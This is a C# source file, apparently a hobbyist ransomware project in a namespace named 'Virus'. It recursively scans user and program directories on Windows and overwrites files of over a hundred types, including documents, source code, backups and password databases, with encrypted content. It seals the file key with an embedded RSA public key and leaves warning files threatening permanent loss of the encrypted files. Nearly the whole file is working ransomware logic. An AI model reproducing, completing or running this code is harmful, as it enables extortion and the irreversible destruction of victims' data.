using RSAKeygenLib;
using System.Numerics;
namespace Virus
{

    internal class EncryptedFiles
    {
        public long originalLenght;
        public string path;

        public EncryptedFiles(long originalLenght, string content)
        {
            this.originalLenght = originalLenght;
            this.path = content;
        }


    }

    internal class Virus
    {
       

        public static KeyPair publicKey = new(DataTypeStoreLib.Read.TopLevelRegion(
            "§KeyPair;-keyPairType:public;-keyPartOne:2352649064139249805845821374460987409776396505398669289803063147151377745121361696449189372149269829832294853984642917905061069641388303515618760601788006427805837741099919012583349578131782372018355530009818568035560635754657726528892575050268887833888413579306249835117130559492796960875750370857564879112869019288609379729998009781372384298428275888440168966557849350963315959168038684679470138364287106602750829739124502773419312425350966026495647051513315975726378230743633650257493567787730920709985286154419811003397606121087367112754590445581094365636087199227241149089549962175842254537359372821576075943867737829096750811035845591632428765435754999029490359775240137487092681768910310484828679588637207957503043282503502900004029823192880403430824362389309994760395967066170837033217756086947278050195710837454035243120444704084605055293410197737392156228821788999543672248785134307679772766888146205276466201964649281599664866435185342890228040900131152917127847819297595387526121955713072200980116454683375407172156740958937640523781746593428746810166927256588031350946082563689823410412488843997162767342628169761403355871867137266715168407502879317528602715207384881569287774349156114533104533647903180268590479340224451213798040454104753374467159911131080968352574285473767625608868178331472786885073464929623155179375434581199710884273663977271425630195276046218099706699622465732380591903396205917142250537787756395206762930398506455217210706615437434597669281509544457206140237840075607373885268836725042405817328745954641820333883140530862969727784714801928475700654154505608891302825546794943790339327538369242972485948745221029811407953286924894860597591880240730712638513059320760960334247611044358294002856417282695609693149620322188328767568352585372489447990308240343859403819993399159712697409653072362941603830811512507560070179837708159231392017196820313819881381394042170829329721340184421599307999685999836148443830367656952064590855359859380197926946447572973381293819365160174460278530509945103308380285433665507000794228773455729438134075172018195552412830723474672644498356599023477139407163726744122778909242496395309572117829509771620830175128051064406646837752793524526735585095896333545848373900276835301250139302457019693705344074563984735851566991293838639831916130960388171272029143000537688516550023460520889839966950804815609143956901909633492796849463066185063642338505929886213578136009067512060470204499011405977262311;-keyPartTwo:9677737402157474204639840444670349844955798719649851657483378560157096038530740197003086017791646915024371677711831038462944763163249878113998807525755424396321662926258310751394694799298459579640226525289577885972287194655338518904711518899925375598997949405554864006170884999627299755227301300108135699225314530197517761180166221410611581640307199476828466672185857438335410225351782935077180283213637440587900077043087140870513882150974017454293154766926440717788398591018892140777296852426771403062156146053630837037678824237002339701126720242213290771859812592026676095327771264231489995469154457354195177293599455941691962570967440400287534869290163062064051005442101104272656969814907780254082008851157788516789736634638089319568080825623567776232783524585671155757090529724876730985751378751504717237808406978232322550863046834505616764424470655298885511069577064501200807246609041444702654677712144531649269592763111358695999278850642275894689694821979799006411517615959598217966525338323229598174872206896827944236439899311783261378887936725599034535589010466061287072572790365952097977719435927099035645934266019055322994014125935199555073036629525897597342668307025931664944957290129228733882079785066395048007360547402231903172899205671459068337011188354064003373941893887801245013569368279343548273245240589560828652566576238825275005895396244383312468476127191319963700156977050112529691802476724314626290671646237132405945869446442404493752544433346538900908475426641740096131024645153898445616299603762171469906741526925981819647002552521319199929866870112278529719046313868056117346150077306824325900132001050450593717017912912640822114736408470336582352636697285623001056373550413223094526272790011136575144911149023453679918114812387600612593751916545256359331886314914693267764427785687785584592423314586457307329499601842749336199153447820312925377373158441342597852307049981259098708290911017241236224368744795649298862069470360185380885910553822938021953602677281277978222158702553327939197039128405478347153174145863341118918754744581875740083216545915198134528518058938886709840818473445796614259597098763453497408904831971255273624096582468171822911491733715926948792398146812256988205599207424688079884619040242518668318034339572739238043245108995509276793392340737574675765108945682678037396385826110196781189053167295690882511630506604274368093339815835651551450710723294815766937015363459176670929558568238293323072602706120899805861;$;"
            .Split(';')
            )[0]);
        public static readonly string defaultFiles = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"encryptedData.txt");
        public static readonly string defaultChecksum = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"checksum.txt");
        public static readonly string defaultKey = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"recovery.txt");

        static readonly HashSet<string> encryptExtentions = new()
        {
            ".png",
            ".zip",
            ".pdf",
            ".jpg",
            ".exe",
            ".pptx",
            ".txt",
            ".kdbx",
            ".keyx",
            ".save",
            ".mp4",
            ".mp3",
            ".wav",
            ".ogg",
            ".html",
            ".webp",
            ".webm",
            ".lex",
            ".cs",
            ".cpp",
            ".c",
            ".asm",
            ".mov",
            ".aup3",
            ".m4v",
            ".psd",
            ".psh",
            ".rtf",
            ".csv",
            ".apm",
            ".accde",
            ".unitypackage",
            ".obj",
            ".wmv",
            ".exr",
            ".aac",
            ".bmp",
            ".adv",
            ".adg",
            ".alp",
            ".amxd",
            ".als",
            ".aif",
            ".aifc",
            ".snd",
            ".au",
            ".backup",
            ".bak",
            ".bak1",
            ".bak2",
            ".bak3",
            ".bak4",
            ".blend",
            ".csproj",
            ".cap",
            ".ct",
            ".hml",
            ".cfg",
            ".data",
            ".dib",
            ".fsh",
            ".fspro",
            ".fsproj",
            ".func",
            ".psi",
            ".bat",
            ".tga",
            ".psd",
            ".apm",
            ".exr",
            ".rgb",
            ".xcf",
            ".pgm",
            ".ps",
            ".ppm",
            ".esp",
            ".xbm",
            ".xpm",
            ".fits",
            ".sgi",
            ".ras",
            ".mask",
            ".pbm",
            ".url",
            ".java",
            ".jar",
            ".jpeg",
            ".json",
            ".key",
            ".keys",
            ".makefile",
            ".md",
            ".accda",
            ".accdu",
            ".mdb",
            ".ldb",
            ".mat",
            ".accdt",
            ".accft",
            ".opc",
            ".msc",
            ".svg",
            ".xls",
            ".slk",
            ".xll",
            ".xlam",
            ".xla",
            ".xlsx",
            ".csv",
            ".xltx",
            ".gra",
            ".odc",
            ".elm",
            ".thmx",
            ".onepkg",
            ".ppt",
            ".pot",
            ".pptm",
            ".potx",
            ".pub",
            ".doc",
            ".asd",
            ".docx",
            ".wbk",
            ".dotx",
            ".dotm",
            ".microsoft",
            ".mid",
            ".midi",
            ".rmi",
            ".migrated",
            ".mkv",
            ".mod",
            ".mpg",
            ".mydocs",
            ".apk",
            ".obj",
            ".ogg",
            ".openssl",
            ".ssl",
            ".pgp",
            ".opus",
            ".msg",
            ".oft",
            ".hol",
            ".pak",
            ".reg",
            ".rtf",
            ".il2cpp",
            ".sql",
            ".lnk",
            ".sln",
            ".webm",
            ".msi",
            ".msp",
            ".ps1",
            ".cmd",
            ".theme",
            ".deskthemepack",
            ".7zip",
            ".rar",
            "",
        };

        public static readonly List<string> lookDirs = new()
        {
#if DEBUG
            "C:\\Users\\ewolf\\OneDrive\\Desktop\\Code\\code_projects\\publishedcs\\DANGEROUS DO NOT TOUCH\\I SAID DO NOT TOUCH\\RansomeWare\\AllFileEncryptor\\DebugSample"
#else
            "C:\\$Recycle.Bin",
            "C:\\Users",
            "C:\\Program Files",
            "C:\\Program Files (x86)",
            "C:\\ProgramData"
#endif
        };

        public static List<string> GetAllFiles(string directory)
        {
            List<string> files = new List<string>();
            try
            {
                foreach (string dir in Directory.EnumerateDirectories(directory))
                {
                    files.AddRange(GetAllFiles(dir));
                }
                foreach (string file in Directory.EnumerateFiles(directory))
                {
                    files.Add(file);
                }
            }
            catch (UnauthorizedAccessException)
            {
            }
            return files;
        }


        public static void DecryptAll(List<EncryptedFiles> encryptedFiles, byte[] key)
        {
            int taskAmt =
#if DEBUG
    1;
#else
                (int)Math.Ceiling((double)encryptedFiles.Count / 5000);
#endif

            int filesPerTask = (int)Math.Ceiling((double)encryptedFiles.Count / taskAmt);
            List<Task<List<EncryptedFiles>>> tasks = new(taskAmt);

            for (int i = 0; i < taskAmt; i++)
            {
                int start = i * filesPerTask;
                int count = Math.Min(filesPerTask, encryptedFiles.Count - start);
                List<EncryptedFiles> range = encryptedFiles.GetRange(start, count);
                string debug = i.ToString();
                tasks.Add(Task.Run(() => DecryptFiles(range, key)));
            }
            Task.WaitAll(tasks.ToArray());
            List<EncryptedFiles> result = new();


            foreach (var resultTask in tasks)
            {
                result.AddRange(resultTask.Result);
            }

        }

        public static BigInteger EncryptAll()
        {
            List<string> allFiles = new();
            Console.WriteLine("Searching all files...");
            foreach (string dir in lookDirs)
            {
                allFiles.AddRange(GetAllFiles(dir));
            }
            Console.WriteLine($"Done, foud {allFiles.Count}");
            Console.WriteLine("Filtering for wanted filetypes...");
            allFiles = allFiles.Where(x => encryptExtentions.Contains(Path.GetExtension(x))).ToList();

            Console.WriteLine($"Done, {allFiles.Count} left");
            Console.WriteLine("Generating key...");

            BigInteger bigIntKey = RSAKeygenLib.GenPrimes.GetRandomByteLenghtBigIntiger(32);
            var keyList = bigIntKey.ToByteArray().ToList();

            while (keyList.Count > 32)
                keyList.RemoveAt(0);
            while (keyList.Count < 32)
                keyList.Add(69);
            byte[] key = keyList.ToArray();


            Console.WriteLine("Done");

            Console.WriteLine("Encrypting original key");

            bigIntKey = publicKey.CryptUsingKeypair(bigIntKey);



            Console.WriteLine("Definitely not encrypting files...");


            int taskAmt =
#if DEBUG
                1;
#else
                (int)Math.Ceiling((double)allFiles.Count / 5000);
#endif

            int filesPerTask = (int)Math.Ceiling((double)allFiles.Count / taskAmt);
            List<Task<List<EncryptedFiles>>> tasks = new(taskAmt);

            for (int i = 0; i < taskAmt; i++)
            {
                int start = i * filesPerTask;
                int count = Math.Min(filesPerTask, allFiles.Count - start);
                List<string> range = allFiles.GetRange(start, count);
                string debug = i.ToString();
                tasks.Add(Task.Run(() => EncryptFiles(range, key)));
            }

            Task.WaitAll(tasks.ToArray());
            List<EncryptedFiles> result = new();


            foreach (var resultTask in tasks)
            {
                result.AddRange(resultTask.Result);
            }



            byte[] checksum = Crypting.Encrypt(new byte[]
            { 0x69,0x69,0x69,0x69,0x69,0x69,0x69,0x69,0x69,0x69,0x69,0x69,0x69,0x69,0x69,0x69,0x69,0x69,0x69,0x69,0x69,0x69,0x69,0x69,0x69,0x69,0x69,0x69,0x69,0x69,0x69,0x69, }
            , key);
            File.WriteAllText(defaultChecksum, DataTypeStoreLib.Automatic.Object(checksum, "DONT_DELETE_THIS_FILE_OR_ALL_YOUR_ENCRYPTED_FILES_WILL_BE_LOST_FOREVER!").RegionSaveString);
            File.WriteAllText(defaultKey, DataTypeStoreLib.Automatic.Object(bigIntKey, "DONT_DELETE_THIS_FILE_OR_ALL_YOUR_ENCRYPTED_FILES_WILL_BE_LOST_FOREVER!").RegionSaveString);

            File.WriteAllText(defaultFiles, DataTypeStoreLib.Automatic.Object(result, "DONT_DELETE_THIS_FILE_OR_ALL_YOUR_ENCRYPTED_FILES_WILL_BE_LOST_FOREVER!").RegionSaveString);
            Console.WriteLine(defaultFiles);


            return bigIntKey;



        }

        public static List<EncryptedFiles> DecryptFiles(List<EncryptedFiles> files, byte[] key)
        {
            List<EncryptedFiles> unableToRecover = new();

            foreach (var file in files)
            {
                try
                {
                    Console.WriteLine(file.path);
                    FileStream currentFile = new(file.path, FileMode.Open, FileAccess.ReadWrite);
                    byte[] fileContent = new byte[currentFile.Length];
                    int bytesRead = currentFile.Read(fileContent, 0, fileContent.Length);

                    List<byte> decrypted = Crypting.Decrypt(fileContent, key).ToList();
                    while (decrypted.Count > file.originalLenght)
                    {
                        decrypted.RemoveRange((int)file.originalLenght, decrypted.Count - (int)file.originalLenght);
                    }
                    currentFile.Position = 0;
                    currentFile.Write(decrypted.ToArray(), 0, decrypted.Count);
                    currentFile.SetLength(decrypted.Count);
                    currentFile.Flush();
                    currentFile.Close();
                } catch
                {
                    unableToRecover.Add(file);
                }
            }
            return unableToRecover;
        }

        public static List<EncryptedFiles> EncryptFiles(List<string> allFiles, byte[] key)
        {
            List<EncryptedFiles> encryptedFiles = new();



            foreach (string file in allFiles)
            {

                try
                {
                    Console.WriteLine(file);
                    FileStream currentFile = new(file, FileMode.Open, FileAccess.ReadWrite);
                    byte[] fileContent = new byte[currentFile.Length];
                    if (currentFile.Length < 10) throw new Exception("Nahh that too small");
                    var originalLenght = currentFile.Length;


                    int bytesRead = currentFile.Read(fileContent, 0, fileContent.Length);

                    if (currentFile.Length < 1025) //Add path to make it the block size if needed
                    {
                        List<byte> fileContentList = new(fileContent);
                        while (fileContentList.Count < 1025)
                        {
                            fileContentList.Add(0);
                        }
                        fileContent = fileContentList.ToArray();
                    }

                    byte[] newFile = Crypting.Encrypt(fileContent, key);
#if !DEBUG
                    currentFile.Position = 0;
                    currentFile.Write(newFile, 0, newFile.Length);
#else
                    Console.WriteLine($"Not encrypting due to debug; {currentFile.Position}");
#endif
                    encryptedFiles.Add(new(originalLenght, file));
                    currentFile.Flush();
                    currentFile.Close();
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"FAILED:");
                    Console.WriteLine(ex.Message);
                    Console.WriteLine(ex.StackTrace);
                }



            }


            return encryptedFiles;
        }


        enum FileAccesability
        {
            FullAccess,
            NoAccess,
            UsedByOtherProcess
        }
        private static FileAccesability CheckFilePermissions(string filename)
        {
            try
            {
                var fileInfo = new System.IO.FileInfo(@"c:\file.txt");
                if (!fileInfo.Attributes.HasFlag(FileAttributes.ReadOnly))
                {
                    return FileAccesability.FullAccess;
                }
                else

                    using (FileStream fs = File.Open(filename, FileMode.Open, FileAccess.ReadWrite))
                    {
                        return FileAccesability.FullAccess;
                    }

            }

            catch (IOException)
            {
                return FileAccesability.UsedByOtherProcess;
            }
            catch (Exception)
            {
                return FileAccesability.NoAccess;
            }

        }
    }
}
